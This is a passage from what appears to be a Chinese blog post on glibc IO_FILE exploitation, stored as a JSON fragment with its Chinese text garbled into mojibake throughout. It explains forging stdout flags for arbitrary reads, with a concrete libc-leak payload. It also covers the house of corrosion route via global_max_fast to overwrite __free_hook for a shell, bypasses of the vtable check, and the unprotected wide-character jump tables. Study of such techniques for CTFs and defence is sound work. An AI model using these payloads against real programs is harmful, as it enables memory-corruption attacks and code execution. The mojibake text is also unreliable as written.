åˆ©ç”¨æ–¹å¼ï¼šä»¥å…¨ç¼“å†²æ¨¡å¼ä¸ºä¾‹ï¼Œåªéœ€å°†_IO_write_ptræŒ‡å‘write_startï¼Œ_IO_write_endæŒ‡å‘write_endå³å¯ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰å®å®šä¹‰#define _IO_LINE_BUF 0x0200ï¼Œæ­¤å¤„flag \u0026amp; _IO_LINE_BUFä¸ºçœŸï¼Œåˆ™è¡¨ç¤ºflagä¸­åŒ…å«äº†_IO_LINE_BUFæ ‡è¯†ï¼Œå³å¼€å¯äº†è¡Œç¼“å†²æ¨¡å¼ï¼ˆå¯ç”¨setvbuf(stdout,0,_IOLBF,1024)å¼€å¯ï¼‰ï¼Œè‹¥è¦æ„é€ flagåŒ…å«_IO_LINE_BUFæ ‡è¯†ï¼Œåˆ™flag |= 0x200å³å¯ã€‚ ï¼ˆ2ï¼‰ä»»æ„è¯» å…ˆè®¨è®º_IO_new_file_xsputnæºä»£ç ä¸­if (to_do + must_flush \u0026gt; 0)æœ‰å“ªäº›æƒ…å†µä¼šæ‰§è¡Œè¯¥åˆ†æ”¯ä¸­çš„å†…å®¹ï¼š (a) é¦–å…ˆè¦æ˜ç¡®çš„æ˜¯to_doä¸€å®šæ˜¯éè´Ÿæ•°ï¼Œå› æ­¤è‹¥must_flushä¸º1çš„æ—¶å€™å°±ä¼šæ‰§è¡Œè¯¥åˆ†æ”¯ä¸­çš„å†…å®¹ï¼Œè€Œå†å¾€ä¸Šçœ‹ï¼Œå½“éœ€è¦è¾“å‡ºçš„å†…å®¹ä¸­æœ‰\\næ¢è¡Œç¬¦çš„æ—¶å€™å°±ä¼šéœ€è¦åˆ·æ–°è¾“å‡ºç¼“å†²åŒºï¼Œå³å°†must_flushè®¾ä¸º1ï¼Œæ•…å½“è¾“å‡ºå†…å®¹ä¸­æœ‰\\nçš„æ—¶å€™å°±ä¼šæ‰§è¡Œè¯¥åˆ†æ”¯çš„å†…å®¹ï¼Œå¦‚ç”¨putså‡½æ•°è¾“å‡ºå°±ä¸€å®šä¼šæ‰§è¡Œã€‚ (b) è‹¥to_doå¤§äº0ï¼Œä¹Ÿä¼šæ‰§è¡Œè¯¥åˆ†æ”¯ä¸­çš„å†…å®¹ï¼Œå› æ­¤ï¼Œå½“ è¾“å‡ºç¼“å†²åŒºæœªå»ºç«‹ æˆ–è€… è¾“å‡ºç¼“å†²åŒºæ²¡æœ‰å‰©ä½™ç©ºé—´ æˆ–è€… è¾“å‡ºç¼“å†²åŒºå‰©ä½™çš„ç©ºé—´ä¸å¤Ÿä¸€æ¬¡æ€§å°†ç›®æ ‡åœ°å€ä¸­çš„æ•°æ®å®Œå…¨æ‹·è´è¿‡æ¥ çš„æ—¶å€™ï¼Œä¹Ÿä¼šæ‰§è¡Œè¯¥ifåˆ†æ”¯ä¸­çš„å†…å®¹ã€‚ è€Œè¯¥ifåˆ†æ”¯ä¸­ä¸»è¦è°ƒç”¨äº†_IO_OVERFLOW()æ¥åˆ·æ–°è¾“å‡ºç¼“å†²åŒºï¼Œè€Œåœ¨æ­¤è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨_IO_do_write()è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„æ•°æ®ã€‚ ç›¸å…³æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 int _IO_new_file_overflow (_IO_FILE *f, int ch) { // åˆ¤æ–­æ ‡å¿—ä½æ˜¯å¦åŒ…å«_IO_NO_WRITES =\u0026gt; _flagséœ€è¦ä¸åŒ…å«_IO_NO_WRITES if (f-\u0026gt;_flags \u0026amp; _IO_NO_WRITES) { f-\u0026gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; } // åˆ¤æ–­è¾“å‡ºç¼“å†²åŒºæ˜¯å¦ä¸ºç©º ä»¥åŠ æ˜¯å¦ä¸åŒ…å«_IO_CURRENTLY_PUTTINGæ ‡å¿—ä½ // ä¸ºäº†ä¸æ‰§è¡Œè¯¥ifåˆ†æ”¯ä»¥å…å‡ºé”™ï¼Œæœ€å¥½å®šä¹‰ _flags åŒ…å« _IO_CURRENTLY_PUTTING if ((f-\u0026gt;_flags \u0026amp; _IO_CURRENTLY_PUTTING) == 0 || f-\u0026gt;_IO_write_base == NULL) { ... } // è°ƒç”¨_IO_do_write è¾“å‡º è¾“å‡ºç¼“å†²åŒº // ä»_IO_write_baseå¼€å§‹ï¼Œè¾“å‡º(_IO_write_ptr - f-\u0026gt;_IO_write_base)ä¸ªå­—èŠ‚çš„æ•°æ® if (ch == EOF) return _IO_do_write (f, f-\u0026gt;_IO_write_base, f-\u0026gt;_IO_write_ptr - f-\u0026gt;_IO_write_base); return (unsigned char) ch; } libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 static _IO_size_t new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do) { ... _IO_size_t count; // ä¸ºäº†ä¸æ‰§è¡Œelse ifåˆ†æ”¯ä¸­çš„å†…å®¹ä»¥äº§ç”Ÿé”™è¯¯ï¼Œå¯æ„é€ _flagsåŒ…å«_IO_IS_APPENDING æˆ– è®¾ç½®_IO_read_endç­‰äº_IO_write_base if (fp-\u0026gt;_flags \u0026amp; _IO_IS_APPENDING) fp-\u0026gt;_offset = _IO_pos_BAD; else if (fp-\u0026gt;_IO_read_end != fp-\u0026gt;_IO_write_base) { _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-\u0026gt;_IO_write_base - fp-\u0026gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-\u0026gt;_offset = new_pos; } // è°ƒç”¨å‡½æ•°è¾“å‡ºè¾“å‡ºç¼“å†²åŒº count = _IO_SYSWRITE (fp, data, to_do); ... return count; } ç»¼ä¸Šï¼Œä¸ºäº†åšåˆ°ä»»æ„è¯»ï¼Œæ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼Œå³å¯è¿›è¡Œåˆ©ç”¨ï¼š (1) è®¾ç½®_flag \u0026amp;~ _IO_NO_WRITESï¼Œå³_flag \u0026amp;~ 0x8ï¼› (2) è®¾ç½®_flag \u0026amp; _IO_CURRENTLY_PUTTINGï¼Œå³_flag | 0x800ï¼› (3) è®¾ç½®_filenoä¸º1ï¼› (4) è®¾ç½®_IO_write_baseæŒ‡å‘æƒ³è¦æ³„éœ²çš„åœ°æ–¹ï¼Œ_IO_write_ptræŒ‡å‘æ³„éœ²ç»“æŸçš„åœ°å€ï¼› (5) è®¾ç½®_IO_read_endç­‰äº_IO_write_base æˆ– è®¾ç½®_flag \u0026amp; _IO_IS_APPENDINGå³ï¼Œ_flag | 0x1000ã€‚ æ­¤å¤–ï¼Œæœ‰ä¸€ä¸ªå¤§å‰æï¼šéœ€è¦è°ƒç”¨_IO_OVERFLOW()æ‰è¡Œï¼Œå› æ­¤éœ€ä½¿å¾—éœ€è¦è¾“å‡ºçš„å†…å®¹ä¸­å«æœ‰\\næ¢è¡Œç¬¦ æˆ– è®¾ç½®_IO_write_endç­‰äº_IO_write_ptrï¼ˆè¾“å‡ºç¼“å†²åŒºæ— å‰©ä½™ç©ºé—´ï¼‰ç­‰ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œç»å¸¸åˆ©ç”¨putså‡½æ•°åŠ ä¸Šè¿°stdoutä»»æ„è¯»çš„æ–¹å¼æ³„éœ²libcã€‚ _flagçš„æ„é€ éœ€æ»¡è¶³çš„æ¡ä»¶:\n1 2 3 4 _flags = 0xfbad0000 _flags \u0026amp; = ~_IO_NO_WRITES // _flags = 0xfbad0000 _flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800 _flags | = _IO_IS_APPENDING // _flags = 0xfbad1800 å› æ­¤ï¼Œä¾‹å¦‚åœ¨libc-2.27ä¸‹ï¼Œæ„é€ payload = p64(0xfbad1800) + p64(0)*3 + b'\\x58'ï¼Œæ³„éœ²å‡ºçš„ç¬¬ä¸€ä¸ªåœ°å€å³ä¸º_IO_file_jumpsçš„åœ°å€ã€‚ æ­¤å¤–ï¼Œ_flagsä¹Ÿå¯å†åŠ ä¸€äº›å…¶ä»–æ— å…³ç´§è¦çš„éƒ¨åˆ†ï¼Œå¦‚è®¾ç½®ä¸º0xfbad1887ï¼Œ0xfbad1880ï¼Œ0xfbad3887ç­‰ç­‰ã€‚\nglobal_max_fastçš„ç›¸å…³åˆ©ç”¨ (house of corrosion) fastbin_ptråœ¨libc-2.23æŒ‡å‘main_arena+8çš„åœ°å€ï¼Œåœ¨libc-2.27åŠä»¥ä¸ŠæŒ‡å‘main_arena+0x10çš„åœ°å€ï¼Œä»æ­¤åœ°å€å¼€å§‹ï¼Œå­˜æ”¾äº†å„å¤§å°çš„fast binçš„fdæŒ‡é’ˆï¼ŒæŒ‡å‘å„å•é“¾è¡¨ä¸­é¦–ä¸ªå †å—çš„åœ°å€ï¼Œå› æ­¤å¯å°†global_max_fastæ”¹ä¸ºå¾ˆå¤§çš„æ•°ï¼Œå†é‡Šæ”¾å¤§å †å—è¿›å…¥fast binï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†main_arenaåçš„æŸå¤„è¦†ç›–æˆè¯¥å †å—åœ°å€ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ç›®æ ‡åœ°å€ä¸fast binæ•°ç»„çš„åç§»è®¡ç®—å‡ºæ‰€éœ€freeçš„å †å—çš„sizeï¼Œè®¡ç®—æ–¹å¼å¦‚ä¸‹ï¼š\n1 2 3 fastbin_ptr = libc_base + libc.symbols[\u0026#39;main_arena\u0026#39;] + 8(0x10) index = (target_addr - fastbin_ptr) / 8 size = index*0x10 + 0x20 å®¹æ˜“æƒ³åˆ°ï¼Œå¯ä»¥é€šè¿‡æ­¤æ–¹å¼è¿›è¡ŒIO_FILE attackï¼šè¦†å†™_IO_list_allï¼Œä½¿å…¶æŒ‡å‘ä¼ªé€ çš„ç»“æ„ä½“ï¼Œæˆ–è€…ä¼ªé€ ._chainæŒ‡å‘çš„ç»“æ„ä½“æ¥å®ç°ä»»æ„è¯»å†™ï¼Œæˆ–è€…ä¼ªé€ vtableï¼ˆlibc-2.23ï¼‰ã€‚ ä¹Ÿå¯ä»¥åˆ©ç”¨æ­¤æ–¹å¼ï¼Œä¿®æ”¹__free_hookå‡½æ•°ï¼ˆ__malloc_hookä¸__realloc_hookåœ¨main_arenaçš„ä¸Šæ–¹ï¼‰ï¼Œä»è€Œgetshellï¼Œæ­¤æ—¶éœ€è¦æœ‰UAFæ¼æ´ä¿®æ”¹__free_hookä¸­çš„fake fast binçš„fdä¸ºsystem_addræˆ–one_gadgetï¼ˆè¿™é‡Œä¸æ¶‰åŠè¯¥fdæŒ‡é’ˆæŒ‡å‘çš„å †å—çš„å–å‡ºï¼Œå› æ­¤ä¸éœ€è¦ä¼ªé€ sizeï¼‰ï¼Œç„¶åç”³è¯·å‡ºè¿™ä¸ªfake fast binï¼Œäºæ˜¯__free_hookè¿™é‡Œçš„â€œä¼ªé“¾è¡¨å¤´â€å°†ä¼šæŒ‡å‘è¢«ç§»å‡ºè¯¥å•é“¾è¡¨çš„fake fast binçš„fdå­—æ®µä¸­çš„åœ°å€ï¼Œå³ä½¿å¾—__free_hookä¸­çš„å†…å®¹è¢«ä¿®æ”¹æˆäº†system_addræˆ–one_gadgetã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè‹¥æ˜¯ç”¨æ­¤æ–¹æ³•æ”¹stdoutæ¥æ³„éœ²ç›¸å…³ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä¸æ”¹_flagsï¼Œå¦‚å‡è®¾æœ‰æ¼æ´å¯ä»¥ä¿®æ”¹ä¸€ä¸ªå †å—çš„sizeï¼Œé‚£ä¹ˆå¯ä»¥æ„é€ _IO_read_endç­‰äº_IO_write_baseæ¥è¿›è¡Œç»•è¿‡ï¼Œå…·ä½“æ–¹å¼æ˜¯ï¼šæ”¹äº†global_max_faståï¼Œå…ˆé‡Šæ”¾ä¸€ä¸ªéœ€è¦æ³„éœ²å…¶ä¸­å†…å®¹çš„fake fast binåˆ°_IO_read_endï¼ˆæ­¤æ—¶ï¼Œæ­£å¸¸èµ°IOæŒ‡é’ˆçš„è¾“å‡ºå‡ä¼šå¤±æ•ˆï¼Œå› ä¸ºè¿‡ä¸äº†_IO_read_end = _IO_write_baseçš„åˆ¤æ–­ï¼Œå°±ä¸ä¼šæ‰§è¡Œ_IO_SYSWRITEï¼‰ï¼Œç„¶åä¿®æ”¹è¯¥fake fast binçš„sizeï¼Œå†å°†å…¶é‡Šæ”¾åˆ°_IO_write_baseå¤„å³å¯ã€‚ åˆ©ç”¨æ­¤æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥å¯¹libcè¿›è¡Œæ³„éœ²ï¼Œæ¯•ç«Ÿåœ¨ç®—indexçš„æ—¶å€™ï¼Œlibc_baseæ˜¯è¢«æŠµæ¶ˆæ‰çš„ï¼Œæˆ–è€…è¯´ï¼Œæ˜¯å¯ä»¥æ³„éœ²åœ¨fastbinsYä¹‹åçš„æ•°æ®ã€‚æ³„éœ²çš„æ€æƒ³å°±æ˜¯ï¼šå½“freeæ—¶ï¼Œä¼šæŠŠæ­¤å †å—ç½®å…¥fastbiné“¾è¡¨çš„å¤´éƒ¨ï¼Œæ‰€ä»¥åœ¨freeåï¼Œæ­¤å †å—çš„fdä½ç½®çš„å†…å®¹ï¼Œå°±æ˜¯freeå‰æ­¤SIZEçš„é“¾è¡¨å¤´éƒ¨æŒ‡é’ˆï¼Œé€šè¿‡è¶Šç•Œå°±å¯ä»¥è¯»å–LIBCä¸ŠæŸä¸ªä½ç½®çš„å†…å®¹ã€‚\nğŸ”è™šè¡¨æ£€æµ‹ è™šè¡¨æ£€æµ‹æ˜¯2.24ä¹‹ååŠ å…¥çš„å†…å®¹ï¼ŒIO_validate_vtableæ£€æµ‹å¦‚æœè™šè¡¨è¶…å‡ºèŒƒå›´å°±è¿›å…¥_IO_vtable_checkå‡½æ•°ã€‚å„è·¯å¤§ç¥æ‰¾åˆ°çš„houseå¾ˆå¤šéƒ½ä¸æ˜¯æ‰“fileçš„è·³è¡¨ï¼Œè€Œæ˜¯å…¶ä»–å¤„ç†è·³è¡¨ï¼Œä½†éƒ½å·®ä¸å¤ªå¤šã€‚ç®€è¦æ¢³ç†å¦‚ä¸‹ã€‚\n(1) 2.23 çš„æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œå¯ä»¥å°†vtable åŠ«æŒåœ¨å †ä¸Šå¹¶ä¿®æ”¹å…¶å†…å®¹ï¼Œç„¶åè§¦å‘FSOP\n(2) 2.24 å¼•å…¥äº†vtable checkï¼Œä½¿å¾—å°†vtable æ•´ä½“åŠ«æŒåˆ°å †ä¸Šå·²ä¸å¯èƒ½ï¼Œå¤§ä½¬å‘ç°å¯ä»¥ä½¿ç”¨å†…éƒ¨çš„vtableä¸­_IO_str_jumpsæˆ–_IO_wstr_jumpsæ¥è¿›è¡Œåˆ©ç”¨ã€‚\n(3) 2.31 ä¸­å°†_IO_str_finishå‡½æ•°ä¸­å¼ºåˆ¶æ‰§è¡Œfreeå‡½æ•°ï¼Œå¯¼è‡´æ— æ³•ä½¿ç”¨ä¸Šè¿°é—®é¢˜ï¼Œå› è€Œå‚¬ç”Ÿå‡ºå…¶ä»–è°ƒç”¨é“¾ã€‚\nè™šè¡¨èŒƒå›´ è™šè¡¨ä½ç½®åˆ¤æ–­ä¸»è¦åœ¨IO_validate_vtableå‡½æ•°ï¼Œ2.37ä»¥å‰åˆ¤æ–­åŒºé—´ä¸º_IO_helper_jumps - _IO_str_jumpsä¹‹é—´çš„åŒºåŸŸ 0xd60ï¼Œé‡Œé¢æœ‰ä»¥ä¸‹è™šè¡¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 _IO_helper_jumps _IO_old_helper_jumps _IO_cookie_jumps _IO_proc_jumps _IO_str_chk_jumps _IO_wstrn_jumps _IO_wstr_jumps _IO_wfile_jumps_maybe_mmap _IO_wfile_jumps_mmap __GI__IO_wfile_jumps _IO_wmem_jumps _IO_mem_jumps _IO_strn_jumps _IO_obstack_jumps _IO_file_jumps_maybe_mmap _IO_file_jumps_mmap __GI__IO_file_jumps _IO_str_jumps æ”»å‡»_IO_vtable_check åœ¨IO_validate_vtableå‡½æ•°æ£€æŸ¥å¦‚æœè™šè¡¨è¶…å‡ºèŒƒå›´ï¼Œä¼šè¿›å…¥_IO_vtable_checkå‡½æ•°ï¼Œ\n1 2 3 4 5 6 7 8 9 10 void attribute_hidden _IO_vtable_check (void) { #ifdef SHARED /* Honor the compatibility flag. */ void (*flag) (void) = atomic_load_relaxed (\u0026amp;IO_accept_foreign_vtables); #ifdef PTR_DEMANGLE PTR_DEMANGLE (flag); #endif if (flag == \u0026amp;_IO_vtable_check) //æ£€æŸ¥æ˜¯å¦æ˜¯å¤–éƒ¨é‡æ„çš„vtable return; è¿™é‡Œå°±å¾ˆæœ‰æ„æ€ï¼Œä¹Ÿå°±æ˜¯è¯´GNUå…¶å®ä¹ŸåŒæ„ä½ èƒ½å¤Ÿå¤–éƒ¨é‡æ„vtableï¼Œåªæ˜¯è¦æ»¡è¶³ä¸€å®šæ¡ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜æ˜¯å¯ä»¥ç»•è¿‡è™šè¡¨æ£€æµ‹çš„ã€‚\næ³„éœ²ptr_guardï¼Œåç®—IO_accept_foreign_vtablesç„¶åä¿®æ”¹ã€‚ å› ä¸ºIO_accept_foreign_vtablesä¸­åŸºæœ¬éƒ½æ˜¯0ï¼Œç›´æ¥å°†ptr_guardä¿®æ”¹ä¸º\u0026amp;_IO_vtable_checkä¹Ÿå¯ä»¥ã€‚ ä½†æ— è®ºå¦‚ä½•æˆ‘ä»¬éƒ½éœ€è¦æœ‰ldæ–‡ä»¶ã€‚\nå¤–ç½®è™šè¡¨ check_stdfiles_vtableså‡½æ•°æ˜¯è®¾ç½®å¤–ç½®è™šè¡¨çš„å‡½æ•°ï¼Œå¦‚æœèƒ½æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œä¹Ÿå¯ä»¥ç»•è¿‡è™šè¡¨æ£€æµ‹\n1 2 3 4 5 6 7 static void check_stdfiles_vtables (void) { if (_IO_2_1_stdin_.vtable != \u0026amp;_IO_file_jumps || _IO_2_1_stdout_.vtable != \u0026amp;_IO_file_jumps || _IO_2_1_stderr_.vtable != \u0026amp;_IO_file_jumps) IO_set_accept_foreign_vtables (\u0026amp;_IO_vtable_check); } ğŸ§­å®½å­—ç¬¦è·³è¡¨ å°†å®½å­—ç¬¦å‡½æ•°è°ƒç”¨å•ç‹¬æ‹¿å‡ºæ¥ä¸»è¦æ˜¯å› ä¸ºï¼Œç›®å‰ï¼ˆ2.36åŠä»¥å‰ï¼Œ2.37ä¹Ÿæ²¡æœ‰ä¿®è®¢ï¼‰å®½å­—ç¬¦è·³è¡¨çš„å¼•ç”¨æ²¡æœ‰åŠ å…¥ä¿æŠ¤ï¼Œhouse_of_apple house_of_catéƒ½æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚\nä»¥2.36ä¸ºä¾‹ï¼Œç›®å‰ï¼Œæ¶‰åŠåˆ°å®½å­—ç¬¦è·³è½¬çš„å‡½æ•°ä¸€å…±æœ‰19ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´è·³è¡¨ä¸­çš„éƒ½å®šä¹‰äº†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0) #define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define _IO_WUNDERFLOW(FP) WJUMP0 (__underflow, FP) #define _IO_WUFLOW(FP) WJUMP0 (__uflow, FP) #define _IO_WPBACKFAIL(FP, CH) WJUMP1 (__pbackfail, FP, CH) #define _IO_WXSPUTN(FP, DATA, N) WJUMP2 (__xsputn, FP, DATA, N) #define _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N) #define _IO_WSEEKOFF(FP, OFF, DIR, MODE) WJUMP3 (__seekoff, FP, OFF, DIR, MODE) #define _IO_WSEEKPOS(FP, POS, FLAGS) WJUMP2 (__seekpos, FP, POS, FLAGS) #define _IO_WSETBUF(FP, BUFFER, LENGTH) WJUMP2 (__setbuf, FP, BUFFER, LENGTH) #define _IO_WSYNC(FP) WJUMP0 (__sync, FP) #define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP) #define _IO_WSYSREAD(FP, DATA, LEN) WJUMP2 (__read, FP, DATA, LEN) #define _IO_WSYSWRITE(FP, DATA, LEN) WJUMP2 (__write, FP, DATA, LEN) #define _IO_WSYSSEEK(FP, OFFSET, MODE) WJUMP2 (__seek, FP, OFFSET, MODE) #define _IO_WSYSCLOSE(FP) WJUMP0 (__close, FP) #define _IO_WSYSSTAT(FP, BUF) WJUMP1 (__stat, FP, BUF) #define _IO_WSHOWMANYC(FP) WJUMP0 (__showmanyc, FP) #define _IO_WIMBUE(FP, LOCALE) WJUMP1 (__imbue, FP, LOCALE) ä½†å®é™…ä¸Šæœ‰å¼•ç”¨çš„ä»…ä¸ºä»¥ä¸‹4ä¸ª\n1 2 3 4 #define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define _IO_WUFLOW(FP) WJUMP0 (__uflow, FP) #define _IO_WSETBUF(FP, BUFFER, LENGTH) WJUMP2 (__setbuf, FP, BUFFER, LENGTH) #define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP) å…¶ä¸­ï¼Œ_IO_WSETBUFä»…ç”¨åœ¨_IO_setbufferä¸­ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»å¸¸ç”¨çš„setbuf\n","date":"2026-02-10T00:00:00Z","image":"https://A1ester.github.io/p/%EF%B8%8Fio%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93/1_hu8927728436630651407.png","permalink":"https://A1ester.github.io/p/%EF%B8%8Fio%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93/","title":"âš”ï¸IOæ”»å‡»ä¹‹é“"}]